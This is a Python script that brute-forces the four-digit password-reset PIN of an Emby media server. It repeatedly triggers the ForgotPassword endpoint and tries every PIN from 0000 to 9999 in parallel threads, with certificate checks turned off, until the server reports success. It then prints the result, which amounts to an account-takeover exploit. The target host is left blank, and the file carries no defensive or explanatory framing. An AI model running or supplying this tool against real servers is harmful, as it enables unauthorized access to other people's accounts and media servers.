import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor



found_event = threading.Event()
lock = threading.Lock()

host = ''
foo = ''

def generate_pin():
    url = f'{host.rstrip("/")}/emby/Users/ForgotPassword'
    headers = {'Content-Type': 'application/json'}
    try:
        resp = requests.post(url, headers=headers, verify=False, timeout=5)
        print("return:",resp.content)
        return resp.status_code == 200
    except Exception:
        return False


def try_single_pin(session, timeout=3,random_pin=0):
    pin = str(random_pin).zfill(4)
    print(f"Try with random PIN: {pin}")
    url = f'{host.rstrip("/")}/emby/Users/ForgotPassword/Pin'
    payload = {"Pin": str(pin).zfill(4)}
    try:
        resp = session.post(url, json=payload, timeout=timeout, verify=False)
    except Exception:
        return False

    if resp.status_code != 200:
        return False

    try:
        result = resp.json()
    except ValueError:
        return False

    if result.get("Success") is True:
        global foo
        foo = result
        return True

    return False


def get_pin_loop(timeout, sleep_between,pin_begin,pin_end):

    session = requests.Session()
    session.headers.update({'Content-Type': 'application/json'})

    while not found_event.is_set():
        for pin in range(pin_begin, pin_end + 1):
            ok = generate_pin()
            if not ok:
                time.sleep(sleep_between)
                continue

            attempted = try_single_pin(session, timeout=timeout,random_pin=pin)
            if attempted:
                with lock:
                    found_event.set()
                break
            time.sleep(sleep_between)

    session.close()


def get_pin(workers, timeout,sleep_between):
    total_pins = 10000
    chunk_size = total_pins // workers
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for i in range(workers):
            start = i * chunk_size
            end = (start + chunk_size - 1) if i < workers - 1 else 9999
            futures.append(executor.submit(get_pin_loop, timeout, sleep_between, start, end))
        for f in futures:
            f.result()

if __name__ == "__main__":
    host = ''
    get_pin(workers=5, timeout=3,sleep_between=0.2)
    print(foo)
